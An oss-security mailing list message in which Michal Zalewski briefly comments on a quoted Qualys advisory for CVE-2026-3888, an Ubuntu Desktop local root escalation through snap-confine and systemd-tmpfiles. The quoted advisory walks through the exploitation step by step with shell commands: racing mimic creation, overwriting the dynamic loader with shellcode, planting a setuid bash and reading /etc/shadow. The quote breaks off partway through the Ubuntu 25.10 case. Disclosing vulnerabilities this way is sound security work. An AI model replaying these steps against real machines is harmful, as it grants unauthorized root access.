Received: (qmail 3654 invoked by uid 550); 17 Mar 2026 20:35:13 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 32370 invoked from network); 17 Mar 2026 19:58:44 -0000
ARC-Seal: i=1; a=rsa-sha256; t=1773777515; cv=none;
        d=google.com; s=arc-20240605;
        b=HlRoB7AB0GQM2lZy+XwcV5Cl0zFx8WZ5eWcQ44z0UNFhJB4oawBLme2bLXOrJAwqW7
         Xu9B1yagsW5P3M4rlDFX6qCabJEFrGThQzR95BoMPHkDcQe4F5oXYtBzTWW7PufvFxp5
         Dj1mc23GoxqK9XCA4U4Fc69u1o/7umA3G3alQh6PhgHURWpFfAdXy09EbcVw3caeqKsb
         AV1VOV4Y6kQIgs/LFcHAJsr663P0qHQrhSdupWO0CZtooxYvRvMDDrudHj4KGlTZTwQT
         p2Jr9rfzDB1DTn1+rfIHr2YhDxUDgwcGhTcofA7+/OhRL2Ax3FvCu6cawns92gb/Yo3N
         eB1A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=Cgbh3gOYc6Nk3jdA8CuUz3LQt2OQKXMf/9IEhKB9FpM=;
        fh=VmcapKy4YkHBkT61rhNF79RLhIqI6T/FW8rZUdhC2xw=;
        b=IseuFZIFRk6k/WF2yzejF8wlT+dEyA4OKeZm+iS2aufnjxyLCugnF3OSfp5XPscNTe
         0jXckxxcqtIHs1f9fR6OKVlna9rERmglBZiCeLLD4OBedEpw6SLtZfBnXCR8P4NxySWM
         H3o9w20AXhT2SkJp8BK4DCDadPEYmZDwH4lPZEyu7jR+/fY4f/ri7E4lkxcvBiZ47B7Y
         Hrp9Hq+zT1CazxASHwJBsU99cgS2RowCYPo4+0jqyIMD6vKNcMszvc/ERtqvmhmK8KrU
         Z2EPfU0liujYhev8bg2JLHfLdXKajqAqyTro1sWAPQB1GcQ/h0D61CwYr0uBoDtufRiC
         x2cg==;
        darn=lists.openwall.com
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=coredump-cx.20230601.gappssmtp.com; s=20230601; t=1773777515; x=1774382315; darn=lists.openwall.com;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=Cgbh3gOYc6Nk3jdA8CuUz3LQt2OQKXMf/9IEhKB9FpM=;
        b=ZqrlgcqbvztgUYzZXKTJv11nh87ifyiFY2/2AdWt4RxSTf9XW/aafRpAPxTZ8fQZAG
         PluT3l7ynnGc1IDi51fZ6X9n4sKqshQtMJMAKaiwirN4VGFSz7TjCwxla39GlFAHlBef
         lORO/wc0ZTqVZne+kouBIOlGm1jy+cueyxngrvlfOyEWuSEQCFIpeM9Hv8gE9Pg/T7XG
         K95UNh2UMHQcjrtqeBZ25/IfBTlrpH210mRjVU9XuOZx+41V3cJX92ABntPpd6LV7DkZ
         3TCFFzzHJzVqNsNi63V4Kl+ofnudzWFRezQfcJ8WoOnxaWIlhEwEu+unYKp4FbbL0Pb+
         ev1A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1773777515; x=1774382315;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=Cgbh3gOYc6Nk3jdA8CuUz3LQt2OQKXMf/9IEhKB9FpM=;
        b=YshsZZZZF+phI2oke8qJ7FNIk9/fTiXHIgUGYXAv5jTp4A9OItP3dRItOmMCoiNL+/
         lfBHOCdHJ4wE0p91vKXYxtDzJmmRHxf4n5IwU1/kWt9SyQtimh52CPTdkWOVoqLg0Ows
         rwgno2AhqgaP+5CipI266G5DtdHVDq+Rsvm69aapBM4hOIEn7MgXAd9ZsGOJGsbmpv39
         GLhl3Oubp7lyaY3kth6TThS16LPRWQmh17yLue11mfIdGxQxL3A689uWHQljpFIwL9iJ
         EX+UTfmn3sw3irRgMZpsdIvMWQpHUBxxH6adZMOPgFsn/NQ9EXs8aQOQ6mOVGR0znJEp
         ou3g==
X-Gm-Message-State: AOJu0YwJp6sa0gFCHPdHRhnf1U2E8lvlFeGvAp4rNJncGwiZeIJD0vsS
	/+OubAqrB6rd2fZiPoqav7DGSjdGdBG9f49529zODrPpCY08TisLZsH0N9WdrBw68RbWl+G2XCq
	iw/od6js4tI6FYqdtns+gYKI8W48nSlDu+i8OvwVdUyHBMa6YyIMCDm/HVbg=
X-Gm-Gg: ATEYQzwi+pJrpRvcqmGwCBQnj+D2fN5j3psPWTpuBPwJyxNa4yqVe3xkalqjkql6tD8
	xZurGWRWAYeHxQFK+kt5+C8edXLGXKm8C5ND33HXJST8DiClPAEFHd1q3QOw6SLkrlOOzoosarC
	R7OyM7yEw2aEgWc7+6ob5UTzvvoH029w8Cv4aTd7m+lD9BUpBenxcU8TftN5gDMqcHI+BFkSuMR
	uhujGVxuqUj7KXei5wYNjG2fHThj1dU4DVWodiMq9qsTESW6h2b0sJ+nVQ1N9zk33GI9mOC9FHu
	tG9lENTCd0TjOJnBVHjVkXdFTCBr/LzekWhH6c8rApexNjQnbAH0KA2Cbd2Xjz7V1TELDsbjxeQ
	8KZSVix4ioX1B524ULlWWvfCeu6GsKFyteER3oeS6q2Ot9mVDzyhCkviDBHUL
X-Received: by 2002:a05:6512:4385:b0:5a2:7a31:9194 with SMTP id
 2adb3069b0e04-5a27a319417mr67544e87.19.1773777514119; Tue, 17 Mar 2026
 12:58:34 -0700 (PDT)
MIME-Version: 1.0
References: <20260317193301.GA1285@localhost.localdomain>
In-Reply-To: <20260317193301.GA1285@localhost.localdomain>
From: Michal Zalewski <lcamtuf@coredump.cx>
Date: Tue, 17 Mar 2026 13:58:17 -0600
X-Gm-Features: AaiRm53rRY4tcTqt1iUysIvCOjA7zLe77Pl2Bt2WX-UaXxDCNWh3Lo5WZw-T0es
Message-ID: <CALx_OUC5-oQsU630zpth=pCShZ+cT6jEBTnpxnRDMHa3TYjkKg@mail.gmail.com>
To: oss-security@lists.openwall.com, qsa@qualys.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Subject: Re: [oss-security] snap-confine + systemd-tmpfiles = root (CVE-2026-3888)

Nice work... flashbacks from 2002
(https://lcamtuf.coredump.cx/tmp_paper.txt). It's frankly somewhat
mind-boggling that distros keep a world-writable /tmp this day and
age. Whatever questionable benefits it has, it also contributed to
plenty of pointless and easily avoidable vulns.

/mz

On Tue, Mar 17, 2026 at 1:35=E2=80=AFPM Qualys Security Advisory <qsa@qualy=
s.com> wrote:
>
>
> Qualys Security Advisory
>
> Good things come to those who wait:
> snap-confine + systemd-tmpfiles =3D root (CVE-2026-3888)
>
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> Contents
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>
> Summary
> Case study: Ubuntu Desktop 24.04
> - Analysis
> - Exploitation
> Case study: Ubuntu Desktop 25.10
> - Overview
> - Exploitation
> A quick note on the uutils coreutils (the rust-coreutils)
> Acknowledgments
> Timeline
>
>     And that is why Caterpillar was never in a hurry.
>     She knew that good things come to those who wait.
>         -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
>
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> Summary
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>
> We discovered an unusual Local Privilege Escalation (LPE), from any
> unprivileged user to full root, in the default installation of Ubuntu
> Desktop >=3D 24.04. We found this vulnerability particularly interesting:
>
> a/ it stems from the interaction of two otherwise secure programs:
>
> - snap-confine, which is set-user-ID-root (or set-capabilities), and
>   "used internally by snapd to construct the execution environment for
>   snap applications" (man snap-confine);
>
> - systemd-tmpfiles, which is executed as root once per day, and
>   "creates, deletes, and cleans up files and directories, using the
>   configuration file format and location specified in tmpfiles.d(5)"
>   (man systemd-tmpfiles);
>
> b/ an unprivileged local attacker who wants to exploit this LPE must
> wait for 10 days (in Ubuntu > 24.04) or 30 days (in Ubuntu 24.04) to
> obtain a fully privileged root shell.
>
> As a side note, we also discovered a local vulnerability (a race
> condition) in the uutils coreutils (a Rust rewrite of the standard GNU
> coreutils -- ls, cp, rm, cat, sort, etc), which are installed by default
> in Ubuntu 25.10. This vulnerability was mitigated in Ubuntu 25.10 before
> its release (by replacing the uutils coreutils' rm with the standard GNU
> coreutils' rm), and would otherwise have resulted in an LPE (from any
> unprivileged user to full root) in the default installation of Ubuntu
> Desktop 25.10.
>
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> Case study: Ubuntu Desktop 24.04
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>
>     Go slow, go slow,
>     If you want to grow.
>         -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
>
> ________________________________________________________________________
>
> Analysis
> ________________________________________________________________________
>
> We recently noticed that, in the default installation of Ubuntu since
> version 24.04, systemd-tmpfiles is configured to automatically clean up
> the files and directories in /tmp that are older than 30 days (in Ubuntu
> 24.04) or 10 days (in Ubuntu > 24.04). More precisely, systemd-tmpfiles
> traverses /tmp once per day and deletes all the files and directories
> that have not been accessed nor modified for more than 10 or 30 days.
>
> ------------------------------------------------------------------------
> $ cat /etc/os-release
> PRETTY_NAME=3D"Ubuntu 24.04.3 LTS"
> ...
>
> $ cat /usr/lib/tmpfiles.d/tmp.conf
> ...
> D /tmp 1777 root root 30d
> #q /var/tmp 1777 root root 30d
> ------------------------------------------------------------------------
>
> ------------------------------------------------------------------------
> $ cat /etc/os-release
> PRETTY_NAME=3D"Ubuntu 25.10"
> ...
>
> $ cat /usr/lib/tmpfiles.d/tmp.conf
> ...
> q /tmp 1777 root root 10d
> q /var/tmp 1777 root root 30d
> ------------------------------------------------------------------------
>
> From our "Lemmings" and "Leeloo" advisories, we then remembered that
> snap-confine does highly privileged work in /tmp; in particular, in the
> /tmp/snap-private-tmp directory, which is securely created at boot time
> (as user root, mode 0700):
>
>   https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.=
txt
>   https://www.qualys.com/2022/11/30/cve-2022-3328/advisory-snap.txt
>
> ------------------------------------------------------------------------
> $ cat /usr/lib/tmpfiles.d/snapd.conf
> D! /tmp/snap-private-tmp 0700 root root -
> ------------------------------------------------------------------------
>
> We therefore came up with the following idea: if, unbeknownst to
> snap-confine, systemd-tmpfiles deletes one of the files or directories
> from snap-confine's /tmp/snap-private-tmp, can we (an unprivileged local
> attacker) re-create the deleted file or directory ourselves, and exploit
> snap-confine's privileged work to obtain a fully privileged root shell?
>
> Still from our "Lemmings" and "Leeloo" advisories, we also remembered
> that, to set up a snap's sandbox, snap-confine creates a directory named
> /tmp/snap-private-tmp/$SNAP/tmp (as user root, mode 01777) that is later
> bind-mounted onto the /tmp directory inside the snap's sandbox.
>
> And inside this /tmp directory (inside the snap's sandbox), snap-confine
> creates a directory named /tmp/.snap (as user root, mode 0755) to create
> "mimics"; for example, inside the sandbox of each and every snap that is
> installed by default on Ubuntu Desktop, snap-confine bind-mounts the
> /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 directory:
>
> - to bind-mount this directory, snap-confine must first create its
>   /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 mountpoint, which does not
>   normally exist;
>
> - but inside the snap's sandbox, /usr/lib/x86_64-linux-gnu is in a
>   read-only filesystem (the "core22" base's squashfs);
>
> - so snap-confine must first create a "mimic" of
>   /usr/lib/x86_64-linux-gnu (a writable copy of
>   /usr/lib/x86_64-linux-gnu), by:
>
> 1/ bind-mounting the original, read-only /usr/lib/x86_64-linux-gnu onto
> /tmp/.snap/usr/lib/x86_64-linux-gnu (inside the snap's sandbox);
>
> 2/ mounting a new, writable tmpfs onto /usr/lib/x86_64-linux-gnu;
>
> 3/ bind-mounting every file and directory from
> /tmp/.snap/usr/lib/x86_64-linux-gnu back into /usr/lib/x86_64-linux-gnu;
>
> 4/ creating the /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 mountpoint
> (which is in a writable tmpfs now);
>
> 5/ finally bind-mounting
> /snap/firefox/6565/gnome-platform/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0
> (for example) onto /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0.
>
> ------------------------------------------------------------------------
> $ grep /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 /var/lib/snapd/mount/*
> /var/lib/snapd/mount/snap.firefox.fstab:/snap/firefox/6565/gnome-platform=
/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 /usr/lib/x86_64-linux-gnu/webkit2g=
tk-4.0 none rbind,rw,x-snapd.origin=3Dlayout 0 0
> ...
> ------------------------------------------------------------------------
>
> Consequently, our theoretical idea to exploit snap-confine is:
>
> - inside the snap's sandbox, we frequently write to the /tmp directory
>   (but not to /tmp/.snap), and patiently wait for systemd-tmpfiles to
>   delete the unmodified /tmp/.snap directory (but not /tmp) after 10
>   days (in Ubuntu > 24.04) or 30 days (in Ubuntu 24.04);
>
> - we re-create the /tmp/.snap directory ourselves (indeed, /tmp is
>   world-writable), and create our own copy of /usr/lib/x86_64-linux-gnu
>   in /tmp/.snap/usr/lib/x86_64-linux-gnu.exchange;
>
> - we force snap-confine to set up the snap's sandbox afresh, but during
>   the creation of the /usr/lib/x86_64-linux-gnu "mimic", between step 1/
>   and step 3/, we quickly replace /tmp/.snap/usr/lib/x86_64-linux-gnu
>   with our own /tmp/.snap/usr/lib/x86_64-linux-gnu.exchange (indeed,
>   /tmp/.snap belongs to us);
>
> - as a result, during step 3/ of the creation of this "mimic",
>   snap-confine bind-mounts our own files into /usr/lib/x86_64-linux-gnu,
>   so we control every shared library and the dynamic loader (inside the
>   snap's sandbox) and can execute arbitrary code as root by simply
>   executing any dynamically-linked SUID-root binary.
>
> In the following proof of concept for Ubuntu Desktop 24.04, we put this
> theoretical idea into practice.
>
> ________________________________________________________________________
>
> Exploitation
> ________________________________________________________________________
>
> First, we set up the sandbox of one of the snaps that are installed by
> default on Ubuntu Desktop (the "firefox" snap) by executing snap-confine
> with the "core22" base, then we obtain an unprivileged shell inside this
> snap's sandbox, we chdir to its /tmp directory, we frequently write to
> this directory (but not to its /tmp/.snap sub-directory), and we wait
> for systemd-tmpfiles to delete the unmodified /tmp/.snap directory
> (after 30 days, in Ubuntu 24.04).
>
> ------------------------------------------------------------------------
> outside$ cat /etc/os-release
> PRETTY_NAME=3D"Ubuntu 24.04.3 LTS"
> ...
>
> outside$ id
> uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
>
> outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine =
--base core22 snap.firefox.hook.configure /bin/bash
>
> inside$ cd /tmp
>
> inside$ stat ./.snap
> ...
> Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
> ...
>
> inside$ while test -d ./.snap; do touch ./; sleep 60; done
> [30 days pass]
>
> inside$ stat ./.snap
> stat: cannot statx './.snap': No such file or directory
> ------------------------------------------------------------------------
>
> Second, from another shell outside the snap's sandbox, we chdir to
> /tmp/snap-private-tmp/$SNAP/tmp (/tmp inside the snap's sandbox) through
> the /proc/pid/cwd of our sandboxed shell (indeed, we cannot chdir to
> /tmp/snap-private-tmp/$SNAP/tmp directly because /tmp/snap-private-tmp
> belongs to root, mode 0700), we destroy the snap's sandbox (but not its
> /tmp directory) by executing snap-confine with an invalid base (the
> "snapd" base), and we run our firefox_24.04.c helper (which is basically
> CVE-2021-44731-Desktop.c from our "Lemmings" advisory):
>
> - we re-create the ./.snap directory ourselves (/tmp/.snap inside the
>   snap's sandbox), since it was deleted by systemd-tmpfiles, and we
>   create our own copy of /snap/core22/current/usr/lib/x86_64-linux-gnu
>   in ./.snap/usr/lib/x86_64-linux-gnu.exchange;
>
> - we force snap-confine to set up the snap's sandbox afresh, by
>   executing it with the "core22" base, but we "single-step" this
>   execution of snap-confine (we set SNAPD_DEBUG=3D1, we redirect its
>   stderr to an AF_UNIX socket with minimized SO_RCVBUF and SO_SNDBUF, we
>   read() its output byte by byte, and we recv(MSG_PEEK) at its buffered
>   output), to reliably win the race condition between step 1/ and step
>   3/ of the "mimic" creation of /usr/lib/x86_64-linux-gnu;
>
> - as soon as we read() or recv() the following message (immediately
>   after step 1/ of the "mimic" creation of /usr/lib/x86_64-linux-gnu),
>
>   mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.snap/usr/lib/x86_64-l=
inux-gnu"
>
>   we quickly replace snap-confine's ./.snap/usr/lib/x86_64-linux-gnu
>   with our own ./.snap/usr/lib/x86_64-linux-gnu.exchange, whose contents
>   are then bind-mounted into /usr/lib/x86_64-linux-gnu, thus giving us
>   full control over every shared library and the dynamic loader inside
>   the snap's sandbox.
>
> ------------------------------------------------------------------------
> outside$ cd /proc/2396/cwd
>
> outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine =
--base snapd snap.firefox.hook.configure /nonexistent
> /user.slice/user-1001.slice/session-145.scope is not a snap cgroup
>
> outside$ systemd-run --user --scope --unit=3Dsnap.whatever /bin/bash
> Running as unit: snap.whatever.scope; invocation ID: ed50ae80aa9844d6a6e4=
499ea1f4bba8
>
> outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine =
--base snapd snap.firefox.hook.configure /nonexistent
> cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_yMpga4//dev=
: No such file or directory
>
> outside$ exit
>
> outside$ ~/firefox_24.04
> hange.go:351: DEBUG: mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.sn=
ap/usr/lib/x86_64-linux-gnu" type:"" opts:MS_BIND|MS_REC unparsed:"" (error=
: <nil>)
> change.go:351: DEBUG: mount name:"tmpfs" dir:"/usr/lib/x86_64-linux-gnu" =
type:"tmpfs" opts: unparsed:"mode=3D0755,uid=3D0,gid=3D0" (error: <nil>)
> ...
> change.go:351: DEBUG: mount name:"/tmp/.snap/usr/lib/x86_64-linux-gnu/ld-=
linux-x86-64.so.2" dir:"/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" typ=
e:"" opts:MS_BIND unparsed:"" (error: <nil>)
> ...
> change.go:351: DEBUG: mount name:"/snap/firefox/6565/gnome-platform/usr/l=
ib/x86_64-linux-gnu/webkit2gtk-4.0" dir:"/usr/lib/x86_64-linux-gnu/webkit2g=
tk-4.0" type:"none" opts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
> ...
> execv failed: No such file or directory
> ------------------------------------------------------------------------
>
> Third, we obtain an unprivileged shell inside this newly set up sandbox,
> by executing snap-confine with the same "core22" base; and from another
> shell outside this snap's sandbox, we chdir to its / directory, through
> the /proc/pid/root of our sandboxed shell, we copy /usr/bin/busybox to
> ./tmp/sh (/tmp/sh inside the snap's sandbox), and we overwrite the
> dynamic loader ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 (which
> belongs to us) with a simple shellcode that calls setreuid(0) and
> execve(/tmp/sh) (a busybox shell).
>
> ------------------------------------------------------------------------
> outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine =
--base core22 snap.firefox.hook.configure /bin/bash
> inside$
> ------------------------------------------------------------------------
>
> ------------------------------------------------------------------------
> outside$ cd /proc/4516/root
>
> outside$ cp /usr/bin/busybox ./tmp/sh
>
> outside$ cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-=
64.so.2
> ------------------------------------------------------------------------
>
> Fourth, we obtain a root shell inside the snap's sandbox, by executing
> snap-confine itself through snap-confine, which is dynamically linked
> and SUID-root and therefore executes our own dynamic loader's shellcode
> (and hence a busybox shell) as root. (Note: the snap's sandbox contains
> various SUID-root binaries, but only the execution of snap-confine is
> allowed by its AppArmor profile.)
>
> ------------------------------------------------------------------------
> outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine =
--base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
> ...
> BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
> ...
>
> inside# id
> uid=3D0(root) gid=3D1001(jane) groups=3D100(users),1001(jane)
> ^^^^^^^^^^^
>
> inside# cat /etc/shadow
> cat: can't open '/etc/shadow': Permission denied
> ------------------------------------------------------------------------
>
> Fifth, because this root shell is still inside the snap's sandbox,
> confined by an AppArmor profile and a seccomp filter, we copy /bin/bash
> to /var/snap/$SNAP/common/ and chmod it to 04755 (both operations are
> allowed by the AppArmor profile and the seccomp filter), and execute
> this SUID-root shell from outside the snap's sandbox, thereby finally
> gaining full root privileges.
>
> ------------------------------------------------------------------------
> inside# cp /bin/bash /var/snap/firefox/common/
>
> inside# chmod 04755 /var/snap/firefox/common/bash
>
> inside# exit
>
> outside$ /var/snap/firefox/common/bash -p
>
> outside# id
> uid=3D1001(jane) gid=3D1001(jane) euid=3D0(root) groups=3D1001(jane),100(=
users)
>                               ^^^^^^^^^^^^
>
> outside# cat /etc/shadow
> root:*:20305:0:99999:7:::
> daemon:*:20305:0:99999:7:::
> ...
> ------------------------------------------------------------------------
>
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> Case study: Ubuntu Desktop 25.10
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>
>     Why go fast?
>     Let life run past?
>         -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
>
> ________________________________________________________________________
>
> Overview
> ________________________________________________________________________
>
> For Ubuntu Desktop 25.10 we must change our exploitation strategy,
> because snap-confine is not SUID-root anymore; instead, it now has
> capabilities attached:
>
> ------------------------------------------------------------------------
> $ stat /usr/lib/snapd/snap-confine
> ...
> Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
> ...
>
> $ getcap /usr/lib/snapd/snap-confine
> /usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_searc=
h,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=3Dp
> ------------------------------------------------------------------------
>
> These capabilities are actually very powerful, and we can obtain them
> inside a snap's sandbox by slightly revising our exploitation strategy
> from Ubuntu 24.04 (by calling capset() and prctl(PR_CAP_AMBIENT_RAISE)
> instead of setreuid(0)), but most of these capabilities and associated
> syscalls are then denied to us by AppArmor and seccomp, thus preventing
> us from gaining full root privileges outside the snap's sandbox.
>
> Consequently, we decided to re-use the strategy that we used in our
> "Lemmings" advisory to exploit the "snap-store" snap (which is installed
> by default on Ubuntu Desktop): instead of racing against the "mimic"
> creation of /usr/lib/x86_64-linux-gnu, we race against the "mimic"
> creation of /var/lib (which is needed to bind-mount /var/lib/app-info
> inside snap-store's sandbox), which allows us to control /var/lib and
> hence /var/lib/snapd/mount/snap.snap-store.user-fstab, which in turn
> allows us to bind-mount near-arbitrary directories and obtain a root
> shell inside snap-store's sandbox, and eventually a fully privileged
> root shell outside snap-store's sandbox.
>
> ________________________________________________________________________
>
> Exploitation
> ________________________________________________________________________
>
> First, we set up snap-store's sandbox by executing snap-confine with the
> "core22" base, we obtain an unprivileged shell inside this sandbox, we
> chdir to its /tmp directory, we frequently write to this directory (but
> not to its /tmp/.snap sub-directory), and we wait for systemd-tmpfiles
> to delete the unmodified /tmp/.snap directory (after 10 days, in Ubuntu
> 25.10).
>
> ------------------------------------------------------------------------
> outside$ cat /etc/os-release
> PRETTY_NAME=3D"Ubuntu 25.10"
> ...
>
> outside$ id
> uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
>
> outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confi=
ne --base core22 snap.snap-store.hook.configure /bin/bash
>
> inside$ cd /tmp
>
> inside$ stat ./.snap
> ...
> Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
> ...
>
> inside$ while test -d ./.snap; do touch ./; sleep 60; done
> [10 days pass]
>
> inside$ stat ./.snap
> stat: cannot statx './.snap': No such file or directory
> ------------------------------------------------------------------------
>
> Second, from another shell outside snap-store's sandbox, we chdir to
> /tmp/snap-private-tmp/$SNAP/tmp (/tmp inside the sandbox) through the
> /proc/pid/cwd of our sandboxed shell, we destroy snap-store's sandbox
> (but not its /tmp directory) by executing snap-confine with an invalid
> base ("snapd"), and we run our snap-store_25.10.c helper (which is also
> basically CVE-2021-44731-Desktop.c from our "Lemmings" advisory):
>
> - we re-create the ./.snap directory ourselves (/tmp/.snap inside
>   snap-store's sandbox), since it was deleted by systemd-tmpfiles, and
>   we create our own copy of /snap/core22/current/var/lib in
>   ./.snap/var/lib.exchange;
>
> - we force snap-confine to set up snap-store's sandbox afresh, by
>   executing it with the "core22" base, but we "single-step" this
>   execution (with SNAPD_DEBUG=3D1), to reliably win the race condition
>   between step 1/ and step 3/ of the "mimic" creation of /var/lib;
>
> - as soon as we see the following debug message (immediately after step
>   1/ of the "mimic" creation of /var/lib),
>
>   mount name:"/var/lib" dir:"/tmp/.snap/var/lib"
>
>   we quickly replace snap-confine's ./.snap/var/lib with our own
>   ./.snap/var/lib.exchange, whose contents are then bind-mounted into
>   /var/lib (inside snap-store's sandbox); this replacement has two
>   beneficial consequences for us:
>
>   a/ we control /var/lib/snapd/mount/snap.snap-store.user-fstab, which
>   allows us to bind-mount near-arbitrary directories inside snap-store's
>   sandbox (these bind-mounts are not completely arbitrary, because they
>   are still confined by an AppArmor profile);
>
>   b/ various SUID-root binaries remain bind-mounted in /tmp/.snap, and
>   their execution is allowed by an AppArmor rule "/tmp/** mrwlkix,"
>   inside snap-store's sandbox.
>
> ------------------------------------------------------------------------
> outside$ cd /proc/4078/cwd
>
> outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confi=
ne --base snapd snap.snap-store.hook.configure /nonexistent
> /user.slice/user-1001.slice/session-33.scope is not a snap cgroup
>
> outside$ systemd-run --user --scope --unit=3Dsnap.whatever /bin/bash
> Running as unit: snap.whatever.scope; invocation ID: 113af972356b4f08a584=
61cf64cc57f6
>
